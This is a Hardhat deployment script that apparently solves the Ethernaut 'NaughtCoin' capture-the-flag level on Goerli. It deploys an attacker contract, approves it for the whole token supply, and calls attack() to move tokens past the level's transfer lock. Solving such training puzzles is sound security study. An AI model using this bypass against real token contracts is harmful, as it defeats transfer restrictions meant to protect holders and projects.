import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "NaughtCoin"
const CONTRACT_ADDRESS = "0x42eC016d62aDe48494C1DAe620D32E04767F346E"
const CONTRACT_NAME_ATTACKER = "NaughtCoinAttacker"

async function main() {
    const NaughtCoin = await ethers.getContractFactory(CONTRACT_NAME)
    const naughtCoin = NaughtCoin.attach(CONTRACT_ADDRESS)

    const NaughtCoinAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const naughtCoinAttacker = await NaughtCoinAttacker.connect(attacker).deploy(CONTRACT_ADDRESS)
    await naughtCoinAttacker.deployed()

    const supply = ethers.utils.parseEther('1000000')
    let tx: TransactionResponse = await naughtCoin.connect(attacker).approve(naughtCoinAttacker.address, supply)
    await tx.wait()

    tx = await naughtCoinAttacker.connect(attacker).attack( { gasLimit: 100000 } )
    await tx.wait()

    console.log("NaughtCoin: got your token balance to 0");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });